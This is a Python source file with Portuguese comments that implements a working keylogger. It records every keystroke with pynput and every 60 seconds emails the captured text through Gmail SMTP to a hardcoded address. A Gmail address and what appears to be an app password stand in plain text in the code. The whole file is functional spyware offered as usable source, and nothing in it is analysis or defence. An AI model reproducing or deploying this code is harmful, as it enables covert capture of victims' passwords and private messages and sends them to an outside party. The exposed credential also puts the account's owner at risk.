# coppy by Isadora ferrão 26/03/2026
#Adicionado teclas de controle e funções especiais para ignorar, como Shift, Ctrl, Alt, Caps Lock, Tab, Esc, Enter, Backspace, Delete, setas de navegação, Home, End, Page Up, Page Down, Insert, Menu, Num Lock, Pause, Print Screen, Scroll Lock e teclas de mídia (Volume Up/Down/Mute, Play/Pause, Next/Previous) e as teclas de função (F1-F12).
#adicionando a opção de envio por email

from http import server
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = "" #variável global para armazenar o log de teclas pressionadas

#configurações do email
EMAIL_REMETENTE = "jhonylogs447@gmail.com"
SENHA_REMETENTE = "ypmh ocxd ffvc bakc"
EMAIL_DESTINATARIO = "jhonylogs447@gmail.com"
SENHA_DESTINATARIO = "ypmh ocxd ffvc bakc"


def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Log de Teclado keylogger'
        msg['From'] = EMAIL_REMETENTE
        msg['To'] = EMAIL_DESTINATARIO

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_REMETENTE, SENHA_REMETENTE)
            server.send_message(msg)
            server.quit()
            print("Email enviado com sucesso!")
        except Exception as e:
            print(f"Erro ao enviar email: {e}")
        
        log = ""  # Limpa o log após enviar o email
    #agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()


#firulas para registrar as teclas pressionadas
def on_press(key):
    global log
    try:
        #se for uma tecla de controle, não a registre
        ##with open("log.txt", "a", encoding="utf-8") as f:
        log+= key.char

    except AttributeError:
        if key == keyboard.Key.space:
            log += " "

        elif key == keyboard.Key.enter:
            log += "\n"

        elif key == keyboard.Key.tab:
            log += "\t"
                
        elif key == keyboard.Key.backspace:
            log += "[BACKSPACE]"

        elif key == keyboard.Key.esc:
            log += "[ESC]"

        else:
            pass #ignorar as outras teclas de controle e funções especiais

#captura as teclas pressionadas
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()  # Inicia o envio de email periódico
    listener.join()
